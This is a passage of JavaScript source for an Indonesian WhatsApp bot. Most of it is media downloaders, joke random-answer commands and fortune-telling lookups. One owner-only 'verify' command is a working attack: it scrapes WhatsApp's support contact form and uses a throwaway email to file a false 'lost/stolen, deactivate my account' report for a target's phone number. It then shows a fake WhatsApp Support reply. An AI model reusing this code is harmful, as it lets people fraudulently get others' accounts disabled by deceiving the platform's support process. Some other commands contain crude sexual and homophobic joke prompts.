if (!q.includes('twitter')) return reply(`Link Invalid!!`)
msg.reply(mess.wait)
var anunya = await api2.downloader.twitter(q)
bob.sendMessage(from, { video: { url: anunya.quality_720}, caption: anunya.caption }, { quoted: nay1 })
}
limitAdd(sender, limit)
break
	
	case prefix + 'gitclone': {
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
var regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!args[0]) return reply(`Link Nya Mana?\nExample: gitclone https://github.com/Hexagonz/SELF-HX`)
if (!regex.test(args[0])) return reply('link salah!')
var [, user, repo] = args[0].match(regex) || []
var repo = repo.replace(/.git$/, '')
var url = `https://api.github.com/repos/${user}/${repo}/zipball`
var filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`Tunggu Sebentar, Mengkompres File Ke Zip...`)
sendFile(M.chat, url, filename, null, nay1)
}
limitAdd(sender, limit)
break

case prefix + 'bisakah':
if (!q) return msg.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
bob.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: nay1 })
break
	
case prefix + 'apakah':
if (!q) return msg.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
bob.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: nay1 })
break
	
case prefix + 'bagaimanakah':
if (!q) return msg.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
bob.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: nay1 })
break
	
case prefix + 'sangecek':
case prefix + 'ceksange':
case prefix + 'gaycek':
case prefix + 'cekgay':
case prefix + 'lesbicek':
case prefix + 'ceklesbi':
if (!q) return msg.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
replyNtag(`Nama : ${q}\nJawaban : *${sange}%*`, { quoted: nay1 })
break

case prefix + 'kapankah':
if (!q) return msg.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
bob.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: nay1 })
break
	
	case prefix + 'hadis': case prefix + 'hadist': 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit() (`*[ LIMIT KAMU HABIS ]*\nBeli limit di buylimit atau beli premium untuk mendapatkan unlimited limit`) 
if (args.length < 1) return msg.reply(`Contoh:
${command} bukhari 1
${command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (args.length < 2) return msg.reply(`Hadis yang ke berapa?\n\ncontoh:\n${command} muslim 1`)
bob.sendMessage(from, { react: { text: "⏱️", key: msg.key }}) 
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
msg.reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
limitAdd(sender, limit)
break;

            case prefix + 'lockcmd': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!isOwner) return reply('Only Onwer..')
                if (!M.quoted) return reply('Reply Pesan!')
                if (!M.quoted.fileSha256) return reply('SHA256 Hash Missing')
                let sticker = global.db.data.cmd
                let hash = M.quoted.fileSha256.toString('base64')
                if (!(hash in sticker)) return reply('Hash not found in database')
                sticker[hash].locked = !/^un/i.test(command)
                limitAdd(sender, limit)
                reply('Done!')
            }
            break

            case prefix + 'afk': {
                let user = global.db.data.users[M.sender]
                user.afkTime = +new Date
                let text = q ? q : 'Tidak Ada!'
                user.afkReason = text
                replyNtag(`@${M.sender.split("@")[0]} Telah Afk dengan alasan ${text}`)
            }
            break


            case prefix + 'menu':
            case prefix + 'help':
            case prefix + 'bob': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                bob.sendMessage(from, {
                    react: {
                        text: "⏱️",
                        key: msg.key
                    }
                })
                const more = String.fromCharCode(8206)
                const readmore = more.repeat(4001)

                function toCommas(x) {
                    x = x.toString()
                    var pattern = /(-?\d+)(\d{3})/;
                    while (pattern.test(x))
                        x = x.replace(pattern, "$1,$2");
                    return x;
                }

                var buttons = [{
                    buttonId: `#owner`,
                    buttonText: {
                        displayText: 'owner'
                    },
                    type: 1
                }]
                var buttonMessage = {
                    document: global.pathImg,
                    fileName: `Selamat ${salam}👋`,
                    mimetype: `application/vnd.openxmlformats-officedocument.wordprocessingml.document`,
                    fileLength: "0",
                    pageCount: "2022",
                    caption: help.listMenu(listmenu, M, sender, prefix, pushname, isOwner, isPremium, balance, limit, limitCount, glimit, gcount),
                    mentions: [sender],
                    footer: `⛽Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Free'}\n📬Limit Harian : ${isOwner ? '∞' : isPremium ? '∞' : getLimit(sender, limitCount, limit)}\n💰Balance : $${toCommas(getBalance(sender, balance))}\nTHANKS TO :\nFEBZ\nYANZ\nAPRILIA\nPENYEDIA MODULE\nDLL\n🎉 Birthday : ${Birthday}`,
                    buttons: buttons,
                    headerType: 3,
                    contextInfo: {
                        "externalAdReply": {
                            "mentionedJid": sender,
                            "title": setting.botName,
                            "mediaType": 1,
                            "renderLargerThumbnail": true,
                            "showAdAttribution": true,
                            "jpegThumbnail": global.pathImg,
                            "mediaUrl": 'youtube.com/c/BOTINDO',
                            "thumbnail": global.pathImg,
                            "thumbnailUrl": 'https://iili.io/bQwD5Q.jpg',
                            "sourceUrl": 'youtube.com/c/BOTINDO',
                        }
                    }
                }
                bob.sendMessage(from, buttonMessage, {
                    quoted: msg
                })
            }
            break


            case prefix + 'sc':
            case prefix + 'script': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                reply(`Minta ke ${global.ownerName} :D`)
                console.log(chalk.rgb(0, 250, 154).underline('Bang ' + ownerName + ' ada yang minta sc!!'));
            }
            break
            
            
            case prefix + 'owner':
            case prefix + 'creator':
                let vcard = 'BEGIN:VCARD\n' +
                    'VERSION:3.0\n' +
                    'N:;PBZ463.;;;' +
                    'FN:PBZ463.\n' +
                    `ORG:${botName};\n` +
                    `item1.TEL;type=CELL;type=VOICE;waid=${numberOwner}:${numberOwner}\n` +
                    'item1.X-ABLabel:Creator bot\n' +
                    'item2.EMAIL;type=INTERNET:@gmail.com\n' +
                    'item2.X-ABLabel:Email\n' +
                    'item3.URL:https://\n' +
                    'item3.X-ABLabel:Instagram\n' +
                    'item4.ADR:;;Indonesia;;;;\n' +
                    'item4.X-ABLabel:Region\n' +
                    'END:VCARD'
                bob.sendMessage(from, {
                    contacts: {
                        displayName: 'Owner Bot',
                        contacts: [{
                            vcard
                        }]
                    }
                }, {
                    quoted: msg
                })
                break
                
                case prefix + 'verify':  {
            	if (!isOwner) throw mess.owner
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await bob.onWhatsApp(froms)
if (cekno.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (froms === ownerNumber) return reply(`Tidak bisa verif My Creator!`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

            case prefix + 'del':
            case prefix + 'del':
            case prefix + 'delete':
            case prefix + 'd': {
                if (!M.quoted.isBaileys) return reply('Pesan tersebut bukan dikirim oleh bot!')
                bob.sendMessage(M.chat, {
                    delete: {
                        remoteJid: M.chat,
                        fromMe: true,
                        id: M.quoted.id,
                        participant: M.quoted.sender
                    }
                })
            }
            break

            /*case prefix +'menu': case prefix +'bob':
            			case prefix +'help': {								
                          bob.sendMessage(from, { react: { text: "⏱️", key: msg.key }})       			
            				bob.sendMessage(from, {
            				   image: { url: 'https://i.ibb.co/Hg1Ltr3/boby.jpg' },
            				   caption: `📍Masi Tahap Pengembangan👀🏁`,
            				   buttons: [{buttonId: `donasi`, buttonText: { displayText: "Donasi" }, type: 1 },
            					{buttonId: `sc`, buttonText: { displayText: "Source Code" }, type: 1 }],
            				   footer: help.listMenu(prefix, listmenu, M)
            			      }, { quoted: nay1 })
            			      }			       				                     
            				break*/

            case prefix + 'donasi':
            case prefix + 'donate':
                reply('seiklas nya:V')
                break

case prefix + 'mediafire':
if(!q) return reply(mess.wait)
api1.mediafiredl(`${q}`).then( res => {
sendFile(M.chat, res.url, res.filename, null, nay1)
//bob.sendMessage(M.chat, {document: { url: media , mimetype: 'application/zip' , fileName: `${res.filename}`}, {quoted:m})
})
break

case prefix + 'nomerhoki': case prefix + 'nomorhoki': {
                if (!Number(q)) throw `Example : ${command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(q))
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
            }
            break
            case prefix + 'artimimpi': case prefix + 'tafsirmimpi': {
                if (!q) throw `Example : ${command} belanja`
                let anu = await primbon.tafsir_mimpi(q)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`)
            }
            break
            case prefix + 'ramalanjodoh': case prefix + 'ramaljodoh': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'ramalanjodohbali': case prefix + 'ramaljodohbali': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'suamiistri': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'ramalancinta': case prefix + 'ramalcinta': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'artinama': {
                if (!q) throw `Example : ${command} Dika Ardianta`
                let anu = await primbon.arti_nama(q)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'kecocokannama': case prefix + 'cocoknama': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = q.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`)
            }
            break
            case prefix + 'kecocokanpasangan': case prefix + 'cocokpasangan': case prefix + 'pasangan': {
                if (!q) throw `Example : ${command} Dika|Novia`
                let [nama1, nama2] = q.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return reply(anu.message)
                bob.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`)
            }
            break
            case prefix + 'jadianpernikahan': case prefix + 'jadiannikah': {
                if (!q) throw `Example : ${command} 6, 12, 2020`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`)
            }
            break
            case prefix + 'sifatusaha': {
                if (!ext)throw `Example : ${command} 28, 12, 2021`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`)
            }
            break
            case prefix + 'rejeki': case prefix + 'rezeki': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'pekerjaan': case prefix + 'kerja': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'ramalannasib': case prefix + 'ramalnasib': case prefix + 'nasib': {
                if (!q) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
            }
            break
            case prefix + 'potensipenyakit': case prefix + 'penyakit': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'artitarot': case prefix + 'tarot': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                bob.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'fengshui': {
                if (!q) throw `Example : ${command} Dika, 1, 2005\n\nNote : ${command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = q.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`)
            }
            break
            case prefix + 'haribaik': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'harisangar': case prefix + 'taliwangke': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'harinaas': case prefix + 'harisial': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`)
            }
            break
            case prefix + 'nagahari': case prefix + 'harinaga': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'arahrejeki': case prefix + 'arahrezeki': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'peruntungan': {
                if (!q) throw `Example : ${command} DIka, 7, 7, 2005, 2022\n\nNote : ${command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = q.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'weton': case prefix + 'wetonjawa': {
                if (!q) throw `Example : ${command} 7, 7, 2005`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
            }
            break
            case prefix + 'sifat': case prefix + 'karakter': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = q.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`)
            }
            break
            case prefix + 'keberuntungan': {
                if (!q) throw `Example : ${command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = q.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`)
            }
            break
            case prefix + 'memancing': {
                if (!q) throw `Example : ${command} 12, 1, 2022`
                let [tgl, bln, thn] = q.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'masasubur': {
                if (!q) throw `Example : ${command} 12, 1, 2022, 28\n\nNote : ${command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = q.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'zodiak': case prefix + 'zodiac': {
